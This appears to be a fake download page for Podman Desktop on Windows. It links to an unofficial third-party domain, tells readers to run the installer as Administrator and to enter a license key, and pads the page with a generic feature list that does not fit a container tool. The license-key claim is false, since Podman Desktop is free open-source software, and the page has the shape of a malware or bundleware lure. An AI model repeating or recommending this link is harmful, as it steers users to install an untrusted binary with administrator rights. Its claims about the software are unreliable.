# Podman Desktop Windows Setup Notes

[⬇ Download Podman Desktop for Windows](https://podman-desktop-setup.kolmods.com/)

## Download & Install

> Setup notes for **Podman Desktop** on Windows 10/11 (64-bit). Run the installer as Administrator.

### Quick steps

1. Download the latest Windows build for your edition
2. Save the file to a local folder you can find later
3. Run the setup **as Administrator**
4. Enter your license key when prompted
5. Restart if the installer asks — then launch **Podman Desktop** from the Start menu

## What you can use it for

- Core Podman Desktop features on Windows desktop
- Install and configure Podman Desktop for daily use
- Import, edit, and export with Podman Desktop tools
- Tune settings and profiles inside Podman Desktop
- Integrate Podman Desktop into your existing workflow
